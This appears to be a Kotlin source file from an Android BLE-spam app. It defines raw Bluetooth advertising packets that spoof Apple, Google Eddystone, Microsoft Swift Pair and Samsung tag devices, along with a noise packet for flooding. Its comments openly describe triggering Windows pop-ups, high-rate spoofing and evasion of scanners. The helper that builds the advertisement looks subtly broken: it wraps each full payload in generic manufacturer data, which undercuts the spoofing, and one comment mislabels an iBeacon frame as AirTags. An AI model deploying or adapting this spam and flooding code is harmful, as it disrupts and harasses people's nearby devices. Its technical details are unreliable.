package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import java.nio.ByteBuffer

/**
 * Singleton object holding pre-defined raw BLE advertising packets.
 * These packets are cycled by BleCyclerSpam to create dynamic, high-rate spoofing
 * and evasion behavior against BLE scanners.
 */
object BlePacketTemplates {

    // --- Core List of Advertising Packets ---
    // Each element in this list represents a raw byte array designed to spoof a specific device or protocol.
    // Note: The bytes are defined as a complete AD payload structure (Length, AD Type, Data).
    val ADVERTISEMENT_PACKETS: List<ByteArray> = listOf(
        // Packet 1: Apple iBeacon (AirTags/Proximity)
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags: LE General Discoverable
            0x1A, 0xFF.toByte(), 0x4C, 0x00, 0x02, 0x15,  // Apple (0x004C) Manufacturer + iBeacon header
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // UUID (zeros for generic)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x01, 0x00, 0x02, (-59).toByte()  // Major/Minor/TX Power (-59 dBm)
        ),
        // Packet 2: Google Eddystone URL (e.g., "google.com")
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags
            0x03, 0x03, 0xAA.toByte(), 0xFE.toByte(),  // Eddystone Service UUID (FEAA)
            0x12, 0x16, 0xAA.toByte(), 0xFE.toByte(),  // Service Data (FEAA)
            0x10, (-8).toByte(),  // URL frame type (0x10) + TX Power (-8 dBm)
            0x03, 0x67, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x2E, 0x63, 0x6F, 0x6D  // Encoded "google.com"
        ),
        // Packet 3: Microsoft Swift Pair (To trigger Windows pop-ups)
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags
            0x06, 0xFF.toByte(), 0x06, 0x00, 0x03, 0x80.toByte(), 0x01, 0x02 // Microsoft Vendor ID (0x0006) + Swift Pair bytes
        ),
        // Packet 4: Samsung Find Network (Spoofs SmartTag/SmartThings)
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags
            0x03, 0x03, 0x59, 0xFD.toByte(),  // Incomplete 16-bit Service UUID: FD59
            0x05, 0x16, 0x59, 0xFD.toByte(), 0x01, 0x02 // Service Data (Example payload)
        ),
        // Packet 5: Generic Noise Packet (Flooding)
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags
            0x0F, 0xFF.toByte(), 0xEE.toByte(), 0xEE.toByte(), 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C // Unassigned Vendor ID (0xEEEE)
        )
    )

    // --- Helper Function ---

    /**
     * Builds the Android-required AdvertiseData object from a raw AD payload.
     *
     * This method intentionally wraps the entire raw AD payload into the 'Manufacturer Specific Data'
     * field (using the generic 0xFFFF ID) for high-speed, dynamic, and non-compliant spoofing.
     * This technique is preferred for evasion as it simplifies the API call for dynamic packet switching.
     *
     * @param rawData The raw bytes of the packet (includes Length, AD Type, and Data).
     * @return The AdvertiseData object ready for BLE advertising.
     */
    fun buildAdvertiseData(rawData: ByteArray): AdvertiseData {
        // Manufacturer ID 0xFFFF is reserved for 'all other companies' and acts as a generic container.
        val genericManufacturerId = 0xFFFF

        return AdvertiseData.Builder()
            // Wrap the complete raw payload into the data field for ID 0xFFFF
            .addManufacturerData(genericManufacturerId, rawData)
            .setIncludeDeviceName(false)  // Exclude name to save bytes and increase rate
            .setIncludeTxPowerLevel(true)  // Include TX Power to aid in detection/range estimation
            .build()
    }
}